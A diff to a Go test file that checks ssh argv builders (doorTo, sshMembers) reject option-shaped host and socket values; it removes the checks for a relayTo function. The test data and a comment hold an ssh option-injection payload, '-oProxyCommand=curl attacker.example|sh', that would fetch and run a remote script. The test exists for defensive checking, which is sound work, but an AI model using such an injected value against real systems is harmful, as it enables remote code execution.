@@ -235,20 +235,14 @@ func TestTheRelayEndsWhenTheDaemonDoesEvenWithStdinStillOpen(t *testing.T) {
 	}
 }
 
-// A host or socket that ssh would read as an OPTION is refused before it reaches argv. A vouched
-// cluster member publishing Host="-oProxyCommand=curl evil|sh" would otherwise make ssh run that
-// command on THIS machine; relayTo/doorTo/sshMembers guard the same way git.go guards a ref.
+// A host that ssh would read as an OPTION is refused before it reaches argv. A vouched cluster
+// member publishing Host="-oProxyCommand=curl evil|sh" would otherwise make ssh run that command on
+// THIS machine; doorTo and sshMembers guard the same way git.go guards a ref.
 func TestSSHArgvRejectsAnOptionShapedHost(t *testing.T) {
 	ctx := context.Background()
 	bad := "-oProxyCommand=curl attacker.example|sh"
-	if _, err := relayTo(ctx, bad, "/tmp/s.sock"); err == nil {
-		t.Error("relayTo built an ssh argv with an option-shaped host")
-	}
 	if _, err := doorTo(ctx, bad, "/tmp/s.sock"); err == nil {
 		t.Error("doorTo built an ssh argv with an option-shaped host")
-	}
-	if _, err := relayTo(ctx, "host.example", "-oProxyCommand=x"); err == nil {
-		t.Error("relayTo built an ssh argv with an option-shaped socket")
 	}
 	for _, s := range []string{"-x", "-oProxyCommand=x", ""} {
 		if sshSafeArg(s) {
